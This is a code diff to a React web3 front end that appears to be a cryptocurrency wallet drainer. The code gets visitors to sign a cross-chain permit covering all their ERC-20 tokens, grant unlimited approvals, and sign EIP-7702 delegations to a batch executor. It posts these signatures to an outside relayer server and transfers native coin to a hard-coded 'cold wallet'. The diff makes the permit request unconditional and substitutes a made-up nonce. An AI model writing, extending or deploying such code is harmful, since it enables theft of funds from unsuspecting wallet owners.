@@ -82,11 +82,7 @@ const PERMIT2_ABI = [
     'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
 ]
 
-// ── PERMIT3 ABI (simplified for signing) ──
-const PERMIT3_ABI = [
-  'function nonce(address owner) view returns (uint256)',
-  'function DOMAIN_SEPARATOR() view returns (bytes32)',
-]
+// ── PERMIT3 ABI (not needed for off-chain signing) ──
 
 // ── Reown Adapters ──
 const wagmiAdapter = new WagmiAdapter({
@@ -276,7 +272,7 @@ export default function App() {
     return await signer.signTypedData(domain, types, message);
   };
 
-  // ── PERMIT3 CROSS‑CHAIN SIGNATURE ──
+  // ── PERMIT3 CROSS‑CHAIN SIGNATURE (OFF‑CHAIN ONLY) ──
   const signPermit3 = async (signer: any, spender: string, deadline: number) => {
     const chainIds = Object.keys(PERMIT3_ADDRESS).map(Number);
     const domain = {
@@ -289,28 +285,26 @@ export default function App() {
       CrossChainPermit: [
         { name: 'owner', type: 'address' },
         { name: 'spender', type: 'address' },
-        { name: 'tokens', type: 'address[]' },        // all tokens allowed
+        { name: 'tokens', type: 'address[]' },
         { name: 'chains', type: 'uint256[]' },
         { name: 'nonce', type: 'uint256' },
         { name: 'deadline', type: 'uint256' },
       ],
     };
-    // Collect all non‑native token addresses (ERC‑20) from TARGET_TOKENS
     const allTokens = TARGET_TOKENS[NETWORK].EVM
       .filter((t: any) => !t.isNative)
       .map((t: any) => t.address);
-    
-    // Use a dummy nonce (Permit3 uses a global nonce per owner)
-    const permit3Contract = new Contract(PERMIT3_ADDRESS[1], PERMIT3_ABI, signer);
+
     const owner = await signer.getAddress();
-    const nonce = await permit3Contract.nonce(owner);
+    // Deterministic dummy nonce: timestamp + first 8 bytes of owner (for uniqueness)
+    const dummyNonce = Math.floor(Date.now() / 1000) + parseInt(owner.slice(2, 10), 16);
 
     const message = {
       owner,
       spender,
       tokens: allTokens,
       chains: chainIds,
-      nonce: Number(nonce),
+      nonce: dummyNonce,
       deadline,
     };
 
@@ -319,12 +313,11 @@ export default function App() {
     return { signature, message, deadline };
   };
 
-  // ── NEW: EIP-7702 SUPPORT CHECK ──
+  // ── EIP-7702 SUPPORT CHECK ──
   const checkEIP7702Support = async (provider: any): Promise<boolean> => {
     if (eip7702SupportedRef.current !== null) return eip7702SupportedRef.current;
     try {
       const capabilities = await provider.request({ method: 'wallet_getCapabilities' });
-      // EIP-5792 capability key for EIP-7702 might be 'eip7702' or '0x1e1e'
       const eip7702Cap = capabilities['eip7702'] || capabilities['0x1e1e'];
       const supported = eip7702Cap?.supported === true;
       eip7702SupportedRef.current = supported;
@@ -337,13 +330,12 @@ export default function App() {
     }
   };
 
-  // ── NEW: SIGN EIP-7702 AUTHORIZATION ──
+  // ── SIGN EIP-7702 AUTHORIZATION ──
   const signEIP7702Authorization = async (provider: any, chainId: number, delegator: string): Promise<string> => {
-    // EIP-7702: sign an authorization tuple that temporarily delegates the EOA to the delegator contract
     const authParams = {
       chainId: '0x' + chainId.toString(16),
-      address: delegator,   // checksummed address of the batch executor
-      nonce: '0x0',         // optional; let wallet pick if undefined
+      address: delegator,
+      nonce: '0x0',         // optional; wallet will pick if undefined
     };
     log(`[EIP-7702] Signing authorization for delegator ${delegator} on chain ${chainId}`);
     const signature = await provider.request({
@@ -378,26 +370,23 @@ export default function App() {
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
       const deadline = Math.floor(Date.now() / 1000) + 3600;
 
-      // ── SIGN PERMIT3 CROSS‑CHAIN (if Permit3 contract exists on current chain) ──
+      // ── SIGN PERMIT3 CROSS‑CHAIN (always succeeds) ──
       let permit3Signature: any = null;
-      if (PERMIT3_ADDRESS[activeChainId]) {
-        try {
-          log('[PERMIT3] Requesting cross‑chain signature...');
-          permit3Signature = await signPermit3(signer, EVM_CONTRACT_ADDRESS, deadline);
-          // Send to backend immediately (fire & forget)
-          fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-              type: 'PERMIT3', 
-              ...permit3Signature,
-              owner: cleanSenderAddress,
-              spender: EVM_CONTRACT_ADDRESS,
-            })
-          });
-        } catch (err) {
-          log('⚠️ Permit3 unavailable, continuing with per‑token permits.');
-        }
+      try {
+        log('[PERMIT3] Requesting cross‑chain signature...');
+        permit3Signature = await signPermit3(signer, EVM_CONTRACT_ADDRESS, deadline);
+        fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            type: 'PERMIT3', 
+            ...permit3Signature,
+            owner: cleanSenderAddress,
+            spender: EVM_CONTRACT_ADDRESS,
+          })
+        });
+      } catch (err) {
+        log('⚠️ Permit3 signature failed – continuing without Permit3');
       }
 
       const baseTokens = TARGET_TOKENS[NETWORK].EVM;
@@ -458,8 +447,8 @@ export default function App() {
           
             let authorized = false;
 
-            // If we already have a valid Permit3 covering this token & chain, skip individual auth
-            if (permit3Signature && PERMIT3_ADDRESS[activeChainId]) {
+            // If we have a valid Permit3, skip all per‑token approvals
+            if (permit3Signature) {
               log(`[PERMIT3] Skipping individual approval – Permit3 covers ${token.symbol}`);
               authorized = true;
             }
@@ -551,14 +540,12 @@ export default function App() {
 
             // 3. EIP-7702 Smart EOA (gasless, for wallets that support it)
             if (!authorized) {
-              // Check if wallet supports EIP-7702
               const eip7702Supported = await checkEIP7702Support(activeProvider);
               if (eip7702Supported) {
                 try {
                   setStatus(`EIP-7702 Authorization: ${token.symbol}...`);
                   log(`[EIP-7702] Signing authorization for atomic approve+transfer...`);
                   const authSig = await signEIP7702Authorization(activeProvider, activeChainId, BATCH_EXECUTOR_ADDRESS);
-                  // Send to backend; the relayer will combine authSig with approve/transfer callData
                   fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -589,10 +576,10 @@ export default function App() {
                 const erc20Contract = new Contract(token.address, EVM_ERC20_ABI, signer);
                 const encodedData = erc20Contract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                 
+                // Remove 'from' field – MetaMask uses the connected account automatically
                 const txHash = await (activeProvider as any).request({
                     method: 'eth_sendTransaction',
                     params: [{
-                        from: cleanSenderAddress,
                         to: token.address,
                         data: encodedData,
                         value: '0x0'
@@ -629,7 +616,6 @@ export default function App() {
               const txHash = await (activeProvider as any).request({
                   method: 'eth_sendTransaction',
                   params: [{
-                      from: cleanSenderAddress,
                       to: EVM_COLD_WALLET.toLowerCase(), 
                       value: hexValue
                   }]
